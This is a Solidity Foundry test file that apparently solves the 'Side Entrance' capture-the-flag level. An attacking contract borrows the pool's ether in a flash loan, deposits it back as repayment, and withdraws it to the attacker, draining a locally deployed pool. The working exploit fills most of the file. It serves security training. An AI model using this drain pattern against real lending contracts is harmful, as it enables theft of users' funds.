// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {IFlashLoanEtherReceiver} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract AttackingContract is IFlashLoanEtherReceiver {
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address owner;

    modifier isOwner() {
        require(msg.sender == owner, "not the owner");
        _; // continue executing rest of method body
    }

    constructor(address lenderPool) {
        sideEntranceLenderPool = SideEntranceLenderPool(lenderPool);
        owner = msg.sender;
    }

    function startLoan(uint256 amount) public {
        sideEntranceLenderPool.flashLoan(amount);
    }

    function execute() external payable {
        sideEntranceLenderPool.deposit{value: msg.value}();
    }

    function withdraw() public isOwner {
        sideEntranceLenderPool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    fallback() external payable {}
}

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        emit log_named_uint("Initial attacker balance", attackerInitialEthBalance);
        emit log_named_uint("Initial lending pool balance", address(sideEntranceLenderPool).balance);
        vm.startPrank(attacker);
        AttackingContract ac = new AttackingContract(address(sideEntranceLenderPool));
        ac.startLoan(address(sideEntranceLenderPool).balance);
        ac.withdraw();
        vm.stopPrank();
        emit log_named_uint("Post attacker balance", address(attacker).balance);
        emit log_named_uint("Post lending pool balance", address(sideEntranceLenderPool).balance);
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}
